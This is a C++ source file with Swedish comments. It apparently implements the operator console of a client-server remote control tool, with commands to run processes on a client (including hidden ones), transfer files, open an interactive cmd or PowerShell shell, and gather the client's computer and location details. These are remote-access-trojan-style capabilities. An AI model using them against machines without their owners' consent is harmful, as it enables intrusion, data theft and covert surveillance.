#pragma once
#include "precompile.h"
#include "server.h"
#include "utility.h"
func_map server::get_client_commands()
{
	return {

		{"detach", [&](std::string args) { // �terg� till server kommandon
			argument_parser(
				[&](std::string value) {
					console_log.Log<LOG_VERBOSE>(logger() << str_time() << " detaching from " << attached->name << "\n");
					attached = nullptr; // peka p� null its�llet f�r p� en klient
					console.set_prompt(default_prompt); // s�tt tillbaka prompt meddelandet
					console.set_functions(utility::add(server_commands, global_commands)); // s�tt tillbaka server funktionerna
			}, args, "detach");
		}},

		{"process", [&](std::string args) { // skapa en process hos klienten
			argument_parser([&](std::string value) {
				message msg;
				// parsa input args f�r att ta reda p� om man vill att processen ska vara synlig eller inte
				auto [arg1, arg2] = utility::ArgSplit(args, ' ');
				if (!arg1.empty()) {
					std::string file;
					if (arg1 == "-p" || arg2 == "-p") { // om anv�ndaren vill v�lja fil
						if (!pick_file("C:\\", file)) { // l�t anv�ndaren v�lja fil och s�tt path till file buffer som passas in som referens i funktionen
							console << "(Status) Failed: Pick Aborted\n"; // om anv�ndaren avbr�t filv�ljning eller klienten f�rlorade anslutning 
							return;
						}
					}

					if (arg1 == "-v" || arg1 == "-h") { // om anv�ndaren specifierade synlighet argumentet
						msg.identifier = "process" + arg1;
						msg.data = arg2;
					}
					else { // om anv�ndaren inte gjorde det
						msg.identifier = "process-v";
						msg.data = args;
					}

					if (!file.empty()) { // om man valde en fil s� s�tt datan till path
						msg.data = file;
					}

					console_log.Log<LOG_INFO>(logger() << str_time() << " Executing\n" << str_time() << "  File:" << file << "\n");

					if (send(*attached, msg)) { // skicka f�rfr�gan 
						// om f�rfr�gan kom fram, v�nta p� svar
						packet response = wait_response("response|" + msg.identifier, attached);
						if (response.data == "SUCCESS") { // skapde processen
							console << "(Status) Success: Executed " << file << " on klient\n";
						}
						else { // kunde inte skapa processen
							console << "(Status) Failed:" << " -> Error[" << std::error_code(std::stoi(response.data), std::system_category()).message() << "]\n";
						}
						delete_packet(response);
					}
					else { // kunde inte skicka meddelande
						console << "(Status) Failed: could not send request " << args << "\n";
					}
				}
				else {
					 // om det inte fanns n�got argument
					console << "The syntax of the command is incorrect. try process -h\n";
					return;
				}
			}, args, "process");
		}},

		{"help", [&](std::string args) { // visa hj�lp
			console << "\n";
			for (auto [func, doc] : klient_help) { // skriver ut alla help dokument
				console << func << " - " << doc << "\n";
			}
			console << "\n";
		}},

		{"download", [&](std::string args) { // ladda ner en fil fr�n klienten
			argument_parser([&](std::string value) {

				//skapa en mapp f�r nedladdningar fr�n klienten
				if (!std::filesystem::is_directory("Downloads_" + attached->name) || std::filesystem::exists("Downloads_" + attached->name)) {
					console_log.Log<LOG_INFO>(logger() << str_time() << " create_dir(" << "Downloads_" << attached->name << ") - ok\n");
					std::filesystem::create_directory("Downloads_" + attached->name);
				}

				message msg{"download", ""};
				std::string file;
				std::string drop_folder = std::filesystem::current_path().string() + "\\Downloads_" + attached->name;
				if (!args.empty() && args == "-p") {  // Om man vill v�lja en fil att ladda ner
					if (pick_file("C:\\", file)) {// l�t anv�ndaren v�lja fil och s�tt path till buffer som passas in som referens i funktionen
						msg.data = file;
						pick_folder_local("C:\\", drop_folder);
					}
					else {  // om anv�ndaren avbr�t filv�ljning eller klienten f�rlorade anslutning 
						console << "(Status) Failed: Pick Aborted\n";
						return;
					}
				}
				else if (!args.empty()) { // annars �r det manuella argument
					auto [file, folder_path] = utility::ArgSplit(args, ' '); // splita argument med delimit ' '
					msg.data = file;
					if (std::filesystem::is_directory(folder_path)) { // om folder_path �r en mapp
						drop_folder = folder_path;
					}
					else if(!folder_path.empty()){
						console << "(Status) Failed: The folder \"" << folder_path << "\" does not exist!\n";
						return;
					}

				}
				else { // om det inte fanns n�got argument
					console << "The syntax of the command is incorrect. try -h\n";
					return;
				}

				console_log.Log<LOG_INFO>(logger() << str_time() << " Downloading\n" << str_time() << "  From:" << file << "\n" << str_time() << "  To:" << drop_folder << " \n");

				if (send(*attached, msg)) { // skicka f�rfr�gan 
					packet response = wait_response("response|" + msg.identifier, attached); // v�nta p� svar
					if (response.data != "FAIL") { // om svaret inte �r FAIL m�ste filen finnas p� klienten
						
						std::filesystem::path path_from_client = msg.data;

						drop_folder += "\\" + path_from_client.filename().string();

						std::ofstream file(drop_folder, std::ios::binary); // �ppna filen i bin�rt skrivande
						file << response.data; // skriv fildatan som man tog emot
						file.close(); // st�ng filen

						console << "(Status) Success: Downloaded to " << drop_folder << "\n";
					}
					else {
						console << "(Status) Failed: No such file\n";
					}
					delete_packet(response); // ta bort fil packetet
				}
				else { // kunde inte skicka meddelande
					console << "(Status) Failed: could not send request " << args << "\n";
				}
			}, args, "download");
		}},

		{"upload", [&](std::string args) { // ladda upp en fil till klienten
			argument_parser([&](std::string value) {
				message msg{"upload", ""};
				std::string upload_file;
				std::string upload_folder;
				if (!args.empty() && args == "-p") {  // Om man vill v�lja en fil att ladda up
					if (pick_file_local("C:\\", upload_file) && pick_folder("C:\\", upload_folder)) {// l�t anv�ndaren v�lja fil och mapp
						msg.data = upload_file + "|" + upload_folder;
					}
					else {  // om anv�ndaren avbr�t filv�ljning eller klienten f�rlorade anslutning 
						console << "(Status) Failed: Pick Aborted\n";
						return;
					}
				}
				else if (!args.empty()) {
					auto [file, folder] = utility::ArgSplit(args, ' ');
					msg.data = file + "|" + folder;
				}
				else { // om det inte fanns n�got argument
					console << "The syntax of the command is incorrect. try -h\n";
					return;
				}

				console_log.Log<LOG_INFO>(logger() << str_time() << " Uploading\n" << str_time() << "  From:" << upload_file << "\n" << str_time() << "  To:" << upload_folder << " \n");

				if (send(*attached, msg)) { // skicka f�rfr�gan

					packet response = wait_response("upload_status", attached); // v�nta p� konfirmation

					if (response.data == "Ok") {

						std::ifstream file(upload_file, std::ios::binary); // l�s in filen bin�rt

						send(*attached, {"upload-data", std::string((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>())}); // konvertera fil till str�ng och skicka

						console << "(Status) Success: Uploaded to " << upload_folder << "\n";
					}
					else {
						console << "(Status) Failed: Bad Folder\n";
					}

				}

			}, args, "upload");
		} },

		{"shell-process", [&](std::string args) { // skapa en shell interaktiv shell p� klienten
			argument_parser([&](std::string value){
				std::string shell = args;
				std::string cwd = R"(C:\Windows\System32)";
				message msg{ "shell-init", "" };
				if (args == "cmd") {
					shell = R"(C:\Windows\System32\cmd.exe)";
				}
				else if (args == "powershell") {
					shell = R"(C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe)";
				}
				else if (!args.empty()) {
					auto [shel, cw] = utility::ArgSplit(args, '|');
					shell = shel;
					cwd = cw;
				}
				else { // om det inte fanns n�got argument
					console << "The syntax of the command is incorrect. try -h\n";
					return;
				}

				msg.data = shell + "|" + cwd;

				console_log.Log<LOG_INFO>(logger() << str_time() << " Shell-Process-Start\n" << str_time() << "  Process:" << shell << "\n" << str_time() << "  CWD:" << cwd << " \n");

				if (send(*attached, msg)) {
					packet response = wait_response("shell-status", attached); // v�nta p� konfirmation

					if (response.data == "OK") {
						delete_packet(response);
						console << "(Status) Success: Shell started\n";
						console_log.Log<LOG_VERBOSE>(logger() << str_time() << " shell_init() - " << Error(0).to_string() << "\n");

						bool dead = false; // process d�d?

						// Anta att konsolen processen skriver ut n�got innan man skriver in n�got. read -> input <- read

						while (!dead && !attached->ip_address.empty()) { // medans processen inte �r d�d och klienten �r ansluten

							int threshold = 3; // detta �r f�r att konsolen blir skrivklar innan allt har hunnit skrivas till pipen, d�rf�r kr�ver vi 3 mer l�sningar f�r att kompensera f�r det
							int writable = 0; // skrivbar?
							// Ta emot data
							while (writable < threshold && !attached->ip_address.empty()) { // medans vi inte kan skriva n�got tar vi emot data
								if (send(*attached, { "shell-read", "now" })) { // skicka f�rfr�gan, om lyckas
									packet respons = wait_response("response|shell-read", attached); // ta emot svar

									auto [status, data] = utility::ArgSplit(respons.data, '|'); // dela status och data fr�n svaret

									//kontrollera status
									// ready => konsolen beh�ver input
									// alive => konsolen �r vid liv och kan l�asas fr�n
									// dead  => konsolen �r d�d och kan inte l�sas fr�n

									if (status == "ready") { // n�r vi kan skriva data s� beh�ver vi inte ta emot mer data
										console_log.Log<LOG_INFO>(logger() << str_time() << " shell_writable() - true" << "\n");
										writable += 1;
									}
									else if (status == "dead") { // n�r processen d�r s� beh�ver vi inte ta emot mer data
										console_log.Log<LOG_INFO>(logger() << str_time() << " shell() - " << Error(10070, "konsolen dog").to_string() << "\n");
										dead = true;
										break;
									}

									if (status != "dead") { // status m�ste vara alive eller ready => printa data
										console << data;
									}

									delete_packet(respons);
								}
								else {
									console << Error(0).to_string() << "\n";
								}
							}

							// Skriv ny input till konsol
							std::string input;
							if (!attached->ip_address.empty() && !dead) {
								input = console.input_str(false);
							}
							if (!attached->ip_address.empty() && send(*attached, {"shell-write", input + "\n"}) && !dead) { // skicka f�rfr�gan
								packet respons = wait_response("response|shell-write", attached); // ta emot svar
								auto [status, data] = utility::ArgSplit(respons.data, '|'); // dela status och data fr�n svaret

								// kontrollera status
								if (status != "alive" || data != "OK") { // => m�ste konsolen vara d�d
									console_log.Log<LOG_INFO>(logger() << str_time() << " shell() - " << Error(10070, "konsolen dog").to_string() << "\n");
									dead = true;
								}
								else { // => skrivning lyckades
									console_log.Log<LOG_INFO>(logger() << str_time() << " write-shell() - " << Error(0, "skrev " + data + " till konsolen").to_string() << "\n");
								}
							}
							else { // antar d� att send returnerade false allts� SOCKET_ERROR -> d�d konsol
								console_log.Log<LOG_INFO>(logger() << str_time() << " shell() - " << Error(10070, "konsolen dog").to_string() << "\n");
								dead = true;
							}
						}



						console << "\n\n(Status) Success: Process Exited\n";
					}
					else {
						console << "(Status) Failed: " << response.data << "\n";
						delete_packet(response);
						return;
					}
				}
			}, args, "shell-process");
		}},

		{"get-info", [&](std::string args){ // beg�r information fr�n klienten
			argument_parser([&](std::string value){
				for (auto& [information_type, information_dict] : attached->information) { // loopa genom informations kategorierna
					for (auto& [key, value] : information_dict) { // loopa genom informations queries
						if (send(*attached, { "info", key })) { // skicka query
							packet response = wait_response("response|info", attached); // v�nta p� svar
							if (response.id.empty() || response.data.empty()) {
								console << "(Status) Failed: Client Disconnected\n";
								return;
							}

							std::string response_string = response.data;
							console_log.Log<LOG_INFO>(logger() << str_time() << " request-info(" << key << ") => " << response_string << "\n");

							value = response_string; // s�tt map v�rdet f�r querien till svars v�rdet tex {"Username", ""} => query = ["Username"] svar = ["dfssf"] => {"Username", "dfssf"} 

							delete_packet(response); // ta bort svaret
						}
						console_log.draw_element();
					}
				}
				console << "(Status) Success: Got information\n";
			}, args, "get-info");
		}},

		{ "show-info", [&](std::string args) { // visa akumulerad information om klienten
			argument_handler(
			{
				{"connection", [&](std::string value){
					console << "{\n" <<
						"  Ip Address: " << attached->ip_address << "\n" <<
						"  Socket Id : " << std::to_string(attached->socket_id) << "\n}\n";
				}},
				{"computer",[&](std::string value){
					console << "{\n";
					utility::print_map(attached->information["computer"], "  ", ": ", "\n", console);
					console << "}\n";
				}},
				{"location",[&](std::string value){
					console << "{\n";
					utility::print_map(attached->information["location"], "  ", ": ", "\n", console);
					console << "}\n";
				}},
				
				{"all", [&](std::string) {
					console << "{\n" <<
						" Connection {\n" <<
						"  Ip Address: " << attached->ip_address << "\n" <<
						"  Socket Id : " << std::to_string(attached->socket_id) << 
						"  \n},\n\n  Computer {\n\n";

					utility::print_map(attached->information["computer"], "    ", ": ", "\n", console);
					console << "\n  },\n\n  Location {\n\n";
					utility::print_map(attached->information["location"], "    ", ": ", "\n", console);
					console << "\n  }\n\n}\n\n";
				}}

			}, args, "show-info");
		}}

	};
}
